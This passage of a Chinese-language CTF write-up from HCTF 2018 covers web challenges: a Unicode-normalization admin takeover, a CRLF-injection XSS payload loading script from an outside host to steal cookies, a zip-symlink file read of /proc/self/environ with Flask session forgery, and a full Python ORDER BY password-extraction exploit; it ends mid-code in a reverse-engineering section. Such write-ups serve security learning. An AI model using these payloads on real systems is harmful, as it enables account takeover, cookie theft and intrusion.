            if 'Set-Cookie' in resp.headers:
                ans = c+ans
                print(ord(c))
                flag=0
                break
        if flag:
            break
        print("--"+ans+"--")
### admin
在
下载到源码，发现每次注册或者是登录的时候都会先将用户名转化成小写，另外修改密码的时候会取session['name']并转化为小写，然后根据转化后的用户名更改密码，调用的函数是：
    def strlower(username):
        username = nodeprep.prepare(username)
        return username
网上搜索得知，这个函数在处理unicode字符时有一些问题，例如\u1d35即ᴵ，经过这个函数会变成大写字母I，然后再调用一下就会变成小写字母i，所以思路就明显了，注册一个admᴵn的账号，登录进去修改admin的密码，然后再登录即可  
### bottle
根据题目提示，搜到bottle的crlf注入，开始bot是挂的，所以一直打不到东西，后来bot好了就行了。直接crlf首先注入一个CSP头部覆盖调已有的，然后注入xss向量即可，中间还需要注一个content-type头部，不然xss向量不解析。网上找到p牛的文章中的exp改一下就行了，exp如下：
>
>  Type:text/html%250aContent-Security-Policy:script-> src%2520*%250a%250a%3Cscript/src=http://zzm.cat/1.js%3E%3C/script%3E>
成功打到cookie  
### Warmup
有个文件读取，结合源码中的提示source.php，得到源码，然后复制了一段网上搜索源码，发现基本就和网上phpmyadmin的洞
>
> 
### hide and seek
随便输个不是admin的用户名即可进后台，然后上传zip，后台会输出zip内的文件内容。试了下压缩软连接文件，可以读文件，`/proc/self/environ`，能读到uwsgi配置文件
    UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgi
    SUPERVISOR_GROUP_NAME=uwsgi
    HOSTNAME=323a960bcc1a
    SHLVL=0
    PYTHON_PIP_VERSION=18.1
    HOME=/root
    GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D
    UWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini
    NGINX_MAX_UPLOAD=0
    UWSGI_PROCESSES=16
    STATIC_URL=/static
    UWSGI_CHEAPER=2
    NGINX_VERSION=1.13.12-1~stretch
    PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
    NJS_VERSION=1.13.12.0.2.0-1~stretch
    LANG=C.UTF-8
    SUPERVISOR_ENABLED=1
    PYTHON_VERSION=3.6.6
    NGINX_WORKER_PROCESSES=auto
    SUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sock
    SUPERVISOR_PROCESS_NAME=uwsgi
    LISTEN_PORT=80STATIC_INDEX=0
    PWD=/app/hard_t0_guess_n9f5a95b5ku9fg
    STATIC_PATH=/app/static
    PYTHONPATH=/app
    UWSGI_RELOADS=
发现web目录，  
接着读/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini  
发现主文件/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py  
阅读源码:
    # -*- coding: utf-8 -*-    from flask import Flask,session,render_template,redirect, url_for, escape, request,Response
    import uuid
    import base64
    import random
    import flag
    from werkzeug.utils import secure_filename
    import os
    random.seed(uuid.getnode())
    app = Flask(__name__)
    app.config['SECRET_KEY'] = str(random.random()*100)
    app.config['UPLOAD_FOLDER'] = './uploads'
    app.config['MAX_CONTENT_LENGTH'] = 100 * 1024
    ALLOWED_EXTENSIONS = set(['zip'])
    def allowed_file(filename):
        return '.' in filename and \
               filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
    @app.route('/', methods=['GET'])
    def index():
        error = request.args.get('error', '')
        if(error == '1'):
            session.pop('username', None)
            return render_template('index.html', forbidden=1)
        if 'username' in session:
            return render_template('index.html', user=session['username'], flag=flag.flag)
        else:
            return render_template('index.html')
    @app.route('/login', methods=['POST'])
    def login():
        username=request.form['username']
        password=request.form['password']
        if request.method == 'POST' and username != '' and password != '':
            if(username == 'admin'):
                return redirect(url_for('index',error=1))
            session['username'] = username
        return redirect(url_for('index'))
    @app.route('/logout', methods=['GET'])
    def logout():
        session.pop('username', None)
        return redirect(url_for('index'))
    @app.route('/upload', methods=['POST'])
    def upload_file():
        if 'the_file' not in request.files:
            return redirect(url_for('index'))
        file = request.files['the_file']
        if file.filename == '':
            return redirect(url_for('index'))
        if file and allowed_file(file.filename):
            filename = secure_filename(file.filename)
            file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            if(os.path.exists(file_save_path)):
                return 'This file already exists'
            file.save(file_save_path)
        else:
            return 'This file is not a zipfile'
        try:
            extract_path = file_save_path + '_'
            os.system('unzip -n ' + file_save_path + ' -d '+ extract_path)
            read_obj = os.popen('cat ' + extract_path + '/*')
            file = read_obj.read()
            read_obj.close()
          os.system('rm -rf ' + extract_path)
        except Exception as e:
            file = None
        os.remove(file_save_path)
        if(file != None):
            if(file.find(base64.b64decode('aGN0Zg==').decode('utf-8')) != -1):
                return redirect(url_for('index', error=1))
        return Response(file)
    if __name__ == '__main__':
        #app.run(debug=True)
        app.run(host='127.0.0.1', debug=True, port=10008)
发现有个flag.py，不过有个判断，直接读的话会跳出。在另一处flag写入了模板文件，因此读了templates/index.html，发现用户名为admin的时候才会输出flag，，判断是否admin根据的是session。然后secret_key是随机数，不过种子是uuid.getnode()，也就是机器的mac地址，因此可以算出来。mac地址读/sys/class/net/eth0/address后转10进制即可，知道了secret_key伪造session即可成功登录拿到flag
### Game
此题的注入方法与hctf2017的一道注入题类似，通过select 查询时order by关键字产生的比较排列次序进行相关字段的内容财解答。  
此题查看前端源码可知要以admin身份访问flag.php方可获取flag，尝试很多数据点进行注入测试均无果。  
/user.php?order=password该接口的order参数可指定当前页面输出的用户信息的排序字段。于是我们的解题思路为，依次注册用户，用户的密码根据递增单调增加，通过观察其通过password字段排序词序位于
id=='1'&&username=='admin' 用户的前后，来进行目标账户passowrd的求解。  
exp如下：
    import requests
    import random
    import string
    def reg(username,password):
        print("reg",username,password)
        session = requests.Session()
        paramsGet = {"action": "reg"}
        paramsPost = {"password": password, "submit": "submit", "sex": "1", "username": username}
        headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                   "Upgrade-Insecure-Requests": "1",
                   "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:62.0) Gecko/20100101 Firefox/62.0",
                   "Referer": "http://game.2018.hctf.io/web2/reg.html", "Connection": "close",
                   "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                   "Content-Type": "application/x-www-form-urlencoded"}
        response = session.post("http://game.2018.hctf.io/web2/action.php", data=paramsPost, params=paramsGet,
                                headers=headers)
        print("Status code:   %i" % response.status_code)
        print("Response body: %s" % response.content)
    def login(session,username,password):
        paramsGet = {"action": "login"}
        paramsPost = {"password": password, "submit": "submit", "username": username}
        headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                   "Upgrade-Insecure-Requests": "1",
                   "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:62.0) Gecko/20100101 Firefox/62.0",
                   "Referer": "http://game.2018.hctf.io/web2/index.html", "Connection": "close",
                   "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                   "Content-Type": "application/x-www-form-urlencoded"}
        response = session.post("http://game.2018.hctf.io/web2/action.php", data=paramsPost, params=paramsGet,
                                headers=headers)
        print("Status code:   %i" % response.status_code)
        print("Response body: %s" % response.content)
    def getUserList(session):
        headers = {"Accept": "*/*", "X-Requested-With": "XMLHttpRequest",
                   "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:62.0) Gecko/20100101 Firefox/62.0",
                   "Referer": "http://game.2018.hctf.io/web2/game/index.html", "Connection": "close",
                   "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"}
        response = session.get("http://game.2018.hctf.io/web2/user.php?order=password", headers=headers)
        print("Status code:   %i" % response.status_code)
        # print("Response body: %s" % response.content)
        tlist = response.text.split('')
        nList = tlist[2:]
        idList = []
        nameList=[]
        for _ in nList:
            info=[]
            ems = _.split('')
            c=0
            for __ in ems:
                x = __.split('')[0].strip()
                if len(x)>0:
                    info.append(x)
                    if c==0:
                        idList.append(x)
                    if c==1:
                        nameList.append(x)
                    c = c + 1
        return idList,nameList
    def getIndexByName(nameList,x):
        return nameList.index(x)
    def getIndexById(idList,x):
        return idList.index(x)
    def genRandomString(slen=10):
        return ''.join(random.sample(string.ascii_letters + string.digits, slen))
    def main():
        myUsername= 'PI:EMAIL'
        myPassword='test@test'
        mySession = requests.Session()
        username="93aa243d3ef17"
        password="DSA8&&!@#$%^&D1NGY1A"
        login(mySession,myUsername,myPassword)
        idList,nameList = getUserList(mySession)
        print(idList)
        print(nameList)
        print(nameList[getIndexById(idList,'1')])
        for _ in range(1,100):
            l=0
            r=128
            while l<r:
                mid=(l+r+1)//2
                temp = chr(mid)
                testPass = password+temp
                testUser = username+genRandomString(10)
                reg(testUser,testPass)
                idList, nameList = getUserList(mySession)
                adminC = getIndexById(idList, '1')
                testC = getIndexByName(nameList, testUser)
                print('compare',adminC,testC,'mid=',mid,'l,r',l,r)
                if adminC<testC:
                    l=mid
                else:
                    r=mid-1
            print(l,r)
            password = password+chr(l)
            print('password',password)
    if __name__ =="__main__":
        main()
由于exp进行二分时是由小逼近，所以注入结果最后一位存在比真实目标值小一的可能，通过求得的结果，登录访问获取flag。
## RE
### Spirial
`Spiral_core.sys`使用了IntelVT技术, 用`vmcall`等指令实现了一个虚拟机. flag第二部分直接写入sys文件.
  * cpuid: 解密opcode
  * invd: 打乱opcode
  * vmcall: 执行指令, 格式`OPCODE|mem[dst]|direction|flag[src]`
  * readmsr 解密mem数据
    a = '''rdmsr(0x176);